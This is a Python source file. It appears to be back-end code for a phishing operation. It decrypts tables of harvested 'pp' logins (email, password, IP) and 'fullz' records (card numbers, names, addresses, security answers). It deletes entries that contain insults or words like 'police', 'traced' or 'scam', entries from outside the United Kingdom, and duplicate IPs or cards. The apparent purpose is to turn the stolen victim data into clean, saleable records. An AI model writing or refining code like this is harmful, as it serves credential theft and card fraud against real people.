from mycrypt import encrypt, decrypt
from mydatabase import conn, query_conn

# Filter module

class FilterModule:
	# init
	def __init__(self):
		try:
			self.ips_pp = []
			self.ids_pp = []
			self.ips_fullz = []
			self.ids_fullz = []
			self.cards = []
			self.badword_mode = 'Equal'
			self.location = 'United Kingdom'
			self.badwords = self.get_badwords()
			self.get_fullz_table()
			self.get_pp_table()
		except Exception as e:
			print('FilterModule init has any errors.')
			print(e)

	# get bad words list
	def get_badwords(self):
		return ['asshole','assholes','police','999','traced','Ofabitch','Bollocks','your dad','your dads','location','b00bs','bastard','bellend','bitch','bitcher','bitchers','bitches','bitchin','bitching','bollock','bollok','cock','cock-sucker','cockface','cunt','cunts','dick','dickhead','fagging','faggot','fagot','fagots','fanny','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckme ','fucks','fuckwhit','fuckwit','jerk-off','knob','knobead','knobed','knobhead','masturbate','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mother fucker','motherfuck','motherfucker','motherfuckers','motherfucking','motherfucks','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nobhead','piss','pissing','pissoff ','prick','pricks','pussies','pussy','pussys ','retard','sadist','screwing','semen','sex','shaggin','shagging','shemale','shit','shitdick','shitfuck','shithead','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty','skank','slut','sluts','smegma','snatch','son-of-a-bitch','spunk','s_h_i_t','t1tt1e5','t1tties','testical','testicle','titfuck','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','twat','twathead','twatty','vagina','wank','wanker','wanky','whore','willies','willy','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole']

	# set bad word remove mode
	# badword_mode  = 'Equal' => ex) 'japper' is not badword (even though 'jap' is badword)
	# badword_mode != 'Equal' => ex) 'japper' is badword 	 (because 'jap' is badword)
	def set_badword_mode(self, mode='Equal'):
		self.badword_mode = mode

	# delete row from table via id
	def delete_row(self, table_name, id):
		try:
			if id > 0:
				query = "delete from `%s` where id=%s" % (table_name, id)
				query_conn.execute(query)
				conn.commit()
				return query_conn.rowcount
		except Exception as e:
			print('FilterModule delete row id=%s from table=%s has any errors.' % (id, table_name))
			print(e)

	# get pp list with ip, id from table
	def get_pp_table(self, table_name = 'pp'):
		try:
			query = "select id, ip_address, email, password, location from `%s` where 1 order by id desc" % table_name
			query_conn.execute(query)
			f_list = query_conn.fetchall()
			for f in f_list:
				id = f[0]
				ip = decrypt(f[1]).replace("| IP Address : ", "").replace("\n", "")
				email = decrypt(f[2]).replace("| Email: ", "").replace("\n", "")
				password = decrypt(f[3]).replace("| Password : ", "").replace("\n", "")
				location = decrypt(f[4]).replace("| Location: ", "").replace("\n", "")

				check = self.check_word([email, password])
				if check == 'EXIST_BAD_WORD':
					self.delete_row(table_name, id)

				check = self.check_location(location)
				if check == 'NOT_UK':
					self.delete_row(table_name, id)

				check, index = self.check_ip(ip, table_name, id)
				if check == 'EXIST_IN_FULLZ' or check == 'EXIST_IN_PP':
					self.delete_row(table_name, id)
		except Exception as e:
			print('FilterModule get %s list has any errors.' % table_name)
			print(e)

	# get fullz list with ip, card number, id from table
	def get_fullz_table(self, table_name = 'fullz'):
		try:
			result_list = []
			query = "select id, ip_address, card_number, full_name, address, secu_answer, location from `%s` where 1 order by id desc" % table_name
			query_conn.execute(query)
			f_list = query_conn.fetchall()
			for f in f_list:
				id = f[0]
				ip = decrypt(f[1]).replace("| IP Address : ", "").replace("\n", "")
				card = decrypt(f[2]).replace("| Card Number : ", "").replace("\n", "")
				full_name = decrypt(f[3]).replace("| Full name : ", "").replace("\n", "")
				address = decrypt(f[4]).replace("| Address : ", "").replace("\n", "")
				secu_answer = decrypt(f[5]).replace("| Security Answer : ", "").replace("\n", "")
				location = decrypt(f[6]).replace("| Location: ", "").replace("\n", "")

				check = self.check_word([full_name, address, secu_answer])
				if check == 'EXIST_BAD_WORD':
					self.delete_row(table_name, id)

				check = self.check_location(location)
				if check == 'NOT_UK':
					self.delete_row(table_name, id)

				check = self.check_card(card)
				if check == 'EXIST_IN_FULLZ':
					self.delete_row(table_name, id)

				check, index = self.check_ip(ip, table_name, id)
				if check == 'EXIST_IN_FULLZ':
					self.delete_row(table_name, id)
				elif check == 'EXIST_IN_PP':
					self.delete_row('pp', index)
			return result_list
		except Exception as e:
			print('FilterModule get %s list has any errors.' % table_name)
			print(e)

	# check ip address with import_type(pp | fullz)
	def check_ip(self, ip, import_type, id=0):
		try:
			if ip in self.ips_fullz:
				index = self.ips_fullz.index(ip)
				return 'EXIST_IN_FULLZ', self.ids_fullz[index]
			elif ip in self.ips_pp:
				index = self.ips_pp.index(ip)
				return 'EXIST_IN_PP', self.ids_pp[index]
			else:
				if import_type == 'pp':
					self.ips_pp.append(ip)
					self.ids_pp.append(id)
				elif import_type == 'fullz':
					self.ips_fullz.append(ip)
					self.ids_fullz.append(id)
				return 'NONE', 0
		except Exception as e:
			print('FilterModule chck ip=%s, type=%s has any errors.' % (ip, import_type))
			print(e)

	# check card number
	def check_card(self, card):
		try:
			if card in self.cards:
				return 'EXIST_IN_FULLZ'
			else:
				self.cards.append(card)
				return 'NONE'
		except Exception as e:
			print('FilterModule chck card=%s has any errors.' % card)
			print(e)

	# check bad word
	def check_word(self, words):
		try:
			for word in words:
				wd = ' ' + word.lower().replace('@', ' @ ').replace('.', ' . ') + ' '
				# print('<%s>' % wd)
				for badword in self.badwords:
					if self.badword_mode == 'Equal':
						pattern = ' '+badword+' '
					else:
						pattern = badword
					if pattern in wd:
						print('bad word[%s] is found.' % badword)
						return 'EXIST_BAD_WORD'
			return 'NONE'
		except Exception as e:
			print('FilterModule chck bad word has any errors.')
			print(e)

	# check location is UK
	def check_location(self, address):
		try:
			if self.location in address:
				return 'IN_UK'
			else:
				return 'NOT_UK'
		except Exception as e:
			print('FilterModule chck location has any errors.')
			print(e)